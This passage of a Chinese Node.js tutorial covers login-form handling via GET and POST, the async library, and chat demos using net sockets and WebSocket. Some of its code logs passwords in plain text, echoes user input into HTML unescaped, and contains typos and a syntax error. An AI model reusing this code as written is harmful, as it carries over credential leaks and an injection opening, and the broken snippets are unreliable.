class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./login"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"email"</span>&gt;</span></span><br><span class="line">    邮箱: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">    密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure><p>toute.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="built_in">require</span>(<span class="string">'./file.js'</span>)</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  login: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> urlObject = url.parse(req.url, <span class="literal">true</span>).query  <span class="comment">// 通过url解析html表单数据</span></span><br><span class="line">    <span class="built_in">console</span>.log(urlObject.email)</span><br><span class="line">    <span class="built_in">console</span>.log(urlObject.password)</span><br><span class="line">    file.readFile(<span class="string">'./views/login.html'</span>, res, req)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.post方式</strong></p><p>route.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> file = <span class="built_in">require</span>(<span class="string">'./file.js'</span>)</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"><span class="keyword">var</span> queryString = <span class="built_in">require</span>(<span class="string">'queryString'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  login: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//post方式</span></span><br><span class="line">    <span class="keyword">var</span> post = <span class="string">''</span></span><br><span class="line">    req.on(<span class="string">'data'</span>, (chunk) =&gt; &#123;</span><br><span class="line">      post += chunk</span><br><span class="line">    &#125;)</span><br><span class="line">    req.on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">      <span class="keyword">var</span> urlObject = queryString.parse(post) <span class="comment">//返回一个url对象</span></span><br><span class="line">      <span class="built_in">console</span>.log(urlObject.email);</span><br><span class="line">      <span class="built_in">console</span>.log(urlObject.password);</span><br><span class="line">    &#125;)</span><br><span class="line">    file.readFile(<span class="string">'./views/login.html'</span>, res, req)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输入的内容回显到本页面</strong></p><p>file.js    </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">  postReadFile:  <span class="function">(<span class="params">file, res, req, post</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> urlObject = queryString.parse(post)</span><br><span class="line">    <span class="keyword">var</span> array = [<span class="string">'email'</span>, <span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">var</span> reg;</span><br><span class="line"></span><br><span class="line">    fs.readFile(file, <span class="string">'utf-8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) <span class="keyword">throw</span> err;</span><br><span class="line">          res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'text/html; charset=utf-8'</span>&#125;)</span><br><span class="line">          <span class="comment">//处理</span></span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;array.length; i++)&#123;</span><br><span class="line">            reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'&#123;'</span> + array[i] + <span class="string">'&#125;'</span>, <span class="string">'gi'</span>)</span><br><span class="line">            data = data.replace(reg, urlObject[array[i]])</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(urlObject.email &amp;&amp; urlObject.password)&#123;</span><br><span class="line">            data = data.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'&#123;infoClass&#125;'</span>, <span class="string">'gi'</span>), <span class="string">''</span>)</span><br><span class="line">            data = data.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'&#123;formClass&#125;'</span>, <span class="string">'gi'</span>), <span class="string">'hide'</span>)</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            data = data.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'&#123;infoClass&#125;'</span>, <span class="string">'gi'</span>), <span class="string">'hide'</span>)</span><br><span class="line">            data = data.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'&#123;formClass&#125;'</span>, <span class="string">'gi'</span>), <span class="string">''</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          res.write(data)</span><br><span class="line">          res.end()</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>route.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">login: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//post方式</span></span><br><span class="line">  <span class="keyword">var</span> post = <span class="string">''</span>;</span><br><span class="line">  req.on(<span class="string">'data'</span>, (chunk) =&gt; &#123;</span><br><span class="line">    post += chunk</span><br><span class="line">  &#125;)</span><br><span class="line">  req.on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">    file.postReadFile(<span class="string">'./views/login.html'</span>, res, req, post)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>login.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"&#123;infoClass&#125;"</span>&gt;</span></span><br><span class="line">  Email:&#123;email&#125; <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  密码:&#123;password&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./login"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"formClass"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"email"</span>&gt;</span></span><br><span class="line">    邮箱: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">    密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="async"><a href="#async" class="headerlink" title="async"></a>async</h4><p><code>npm install async -D</code></p><p>常用功能:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.串行无关联(第一个参数是数组，第二个参数是个回调函数)</span></span><br><span class="line"><span class="comment">//运行时间是两个运行时间总和</span></span><br><span class="line"><span class="built_in">console</span>.time(<span class="string">'test'</span>)</span><br><span class="line"><span class="keyword">async</span>.series([</span><br><span class="line">  (callback) =&gt; &#123; <span class="comment">//数组的第一个元素</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">      callback(<span class="literal">null</span>,<span class="string">'one'</span>)</span><br><span class="line">    &#125;,<span class="number">200</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  (callback)=&gt;&#123; <span class="comment">//数组的第一个元素</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">      callback(<span class="literal">null</span>,<span class="string">'two'</span>)</span><br><span class="line">    &#125;,<span class="number">5000</span>)</span><br><span class="line">  &#125;</span><br><span class="line">],</span><br><span class="line">(err, results) =&gt; &#123;  <span class="comment">// 第二个参数</span></span><br><span class="line">  <span class="built_in">console</span>.log(results);</span><br><span class="line">  <span class="built_in">console</span>.timeEnd(<span class="string">'test'</span>) <span class="comment">//看一下执行时间</span></span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.串行无关联(第二种用法，第一个参数是对象)</span></span><br><span class="line"><span class="built_in">console</span>.time(<span class="string">'test'</span>)</span><br><span class="line"><span class="keyword">async</span>.series(&#123;</span><br><span class="line">  one: <span class="function">(<span class="params">callback</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      callback(<span class="literal">null</span>, <span class="string">'1'</span>)</span><br><span class="line">    &#125;,<span class="number">2000</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  two: <span class="function">(<span class="params">callback</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      callback(<span class="literal">null</span>, <span class="string">'2'</span>)</span><br><span class="line">    ,<span class="number">3000</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;, (err, results) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(results);</span><br><span class="line">    <span class="built_in">console</span>.timeEnd(<span class="string">'test'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3.并行无关联（第一个参数是数组）</span></span><br><span class="line"><span class="comment">//时间取最长的</span></span><br><span class="line"><span class="keyword">async</span>.parallel([</span><br><span class="line">  (callback) =&gt; &#123;</span><br><span class="line">    setTimeout( <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">      callback(<span class="literal">null</span>, <span class="string">'one'</span>)</span><br><span class="line">    &#125;,<span class="number">2000</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  (callback) =&gt; &#123;</span><br><span class="line">    setTimeout( <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">      callback(<span class="literal">null</span>, <span class="string">'two'</span>)</span><br><span class="line">    &#125;,<span class="number">5000</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">], (err,results)=&gt;&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(results);</span><br><span class="line">  <span class="built_in">console</span>.timeEnd(<span class="string">'test'</span>)   <span class="comment">//运行时间5s，取最长的</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//也可以第一个参数是对象</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4.串行有关联</span></span><br><span class="line"><span class="keyword">async</span>.waterfall([</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>)</span>&#123;</span><br><span class="line">    callback(<span class="literal">null</span>,<span class="string">'one'</span>,<span class="string">'two'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">arr1,arr2,callback</span>)</span>&#123;</span><br><span class="line">    callback(<span class="literal">null</span>, arr1,arr2,<span class="string">'three'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">arr1,arr2,arr3,callback</span>)</span>&#123;</span><br><span class="line">    callback(<span class="literal">null</span>, [arr1,arr2,arr3,<span class="string">'done'</span>])</span><br><span class="line">  &#125;</span><br><span class="line">],<span class="function"><span class="keyword">function</span>(<span class="params">err,results</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(results);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//这里没加异步，按照串行顺序依次下来的</span></span><br></pre></td></tr></table></figure><h2 id="六-Socket"><a href="#六-Socket" class="headerlink" title="六. Socket"></a>六. Socket</h2><p><img src="/Node-js-入门/socket.png"></p><h4 id="1-基于net模块实现socket"><a href="#1-基于net模块实现socket" class="headerlink" title="1). 基于net模块实现socket"></a>1). 基于<code>net</code>模块实现socket</h4><p><strong>聊天案例</strong></p><p>server.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>)</span><br><span class="line"><span class="keyword">var</span> chatServer = net.createServer(),</span><br><span class="line">    clientMap = <span class="keyword">new</span> <span class="built_in">Object</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>; <span class="comment">//客户端连接流水号</span></span><br><span class="line">chatServer.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">client</span>)</span>&#123;</span><br><span class="line">  client.name = ++i</span><br><span class="line">  clientMap[client.name] = client</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"客户端 "</span>+ client.name +<span class="string">" 连接成功~"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//对客户端发送消息的监听</span></span><br><span class="line">  client.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"客户端传来："</span> + data);</span><br><span class="line">    broadcast(data, client) <span class="comment">//广播给其他</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//数据错误的处理</span></span><br><span class="line">  client.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"client error: "</span> + err);</span><br><span class="line">    client.end()</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//客户端关闭事件</span></span><br><span class="line">  client.on(<span class="string">'close'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">delete</span> clientMap[client.name]</span><br><span class="line">      <span class="built_in">console</span>.log(client.name + <span class="string">"下线了"</span>);</span><br><span class="line">      broadcast(client.name+<span class="string">"下线了"</span>, client) <span class="comment">//广播给其他</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">chatServer.listen(<span class="number">9000</span>)  <span class="comment">//监听端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//消息广播</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">broadcast</span> (<span class="params">message, client</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> clientMap)&#123;</span><br><span class="line">    clientMap[key].write(client.name + <span class="string">' say:'</span> + message + <span class="string">"\n"</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>)</span><br><span class="line"><span class="keyword">var</span> port = <span class="number">9000</span></span><br><span class="line"><span class="keyword">var</span> host = <span class="string">'127.0.0.1'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket()</span><br><span class="line">client.setEncoding = <span class="string">'UTF-8'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line">client.connect(port, host, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  client.write(<span class="string">"您好"</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听服务端消息</span></span><br><span class="line">client.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"服务端传来："</span> + data);</span><br><span class="line">  say()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">client.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">client.on(<span class="string">'close'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'connection closed'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">'readline'</span>)</span><br><span class="line"><span class="keyword">const</span> r1 = readline.createInterface(&#123;</span><br><span class="line">  input: process.stdin,   <span class="comment">//标准输入</span></span><br><span class="line">  output: process.stdout</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  r1.question(<span class="string">'请输入：'</span>, (<span class="function"><span class="params">inputStr</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (inputStr != <span class="string">'bye'</span>)&#123;</span><br><span class="line">      client.write(inputStr + <span class="string">'\n'</span>)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      client.distory() <span class="comment">//关闭连接</span></span><br><span class="line">      r1.close()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-浏览器原生支持的WebSocket"><a href="#2-浏览器原生支持的WebSocket" class="headerlink" title="2). 浏览器原生支持的WebSocket"></a>2). 浏览器原生支持的<code>WebSocket</code></h4><p><code>npm install ws</code></p><p>案例同上</p><p>server.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wbsocketServer = <span class="built_in">require</span>(<span class="string">'ws'</span>).Server,</span><br><span class="line">    wss = <span class="keyword">new</span> wbsocketServer(&#123;<span class="attr">port</span>:<span class="number">9001</span>&#125;)</span><br><span class="line"><span class="keyword">var</span> clientMap = <span class="keyword">new</span> <span class="built_in">Object</span>()</span><br><span class="line"><span class="keyword">var</span> i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">wss.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">ws</span>)</span>&#123;</span><br><span class="line">  ws.name = ++i</span><br><span class="line">  clientMap[ws.name] = ws</span><br><span class="line">  <span class="built_in">console</span>.log(ws.name + <span class="string">" 上线了"</span>);</span><br><span class="line"></span><br><span class="line">  ws.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">message</span>)</span>&#123;</span><br><span class="line">    broadcast(message, ws)</span><br><span class="line">  &#125;)</span><br><span class="line">  ws.on(<span class="string">'close'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">message</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// global.gc()  //调用内存回收</span></span><br><span class="line">    <span class="built_in">console</span>.log(ws + <span class="string">" 离开"</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//广播方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">broadcast</span>(<span class="params">msg, ws</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> clientMap)&#123;</span><br><span class="line">    clientMap[key].send(ws.name + <span class="string">'说：'</span> + msg)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> WebSocket = <span class="built_in">require</span>(<span class="string">'ws'</span>)</span><br><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">'ws://127.0.0.1:9001/'</span>)</span><br><span class="line"></span><br><span class="line">ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  ws.send(<span class="string">'大家好'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> chatroom = <span class="built_in">document</span>.getElementById(<span class="string">'chatroom'</span>)</span><br><span class="line">  chatroom.innerHtml += <span class="string">'&lt;/br&gt;'</span> + event.data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ws.onclose = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'Closed'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ws.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'Error:'</span> + err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chat.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 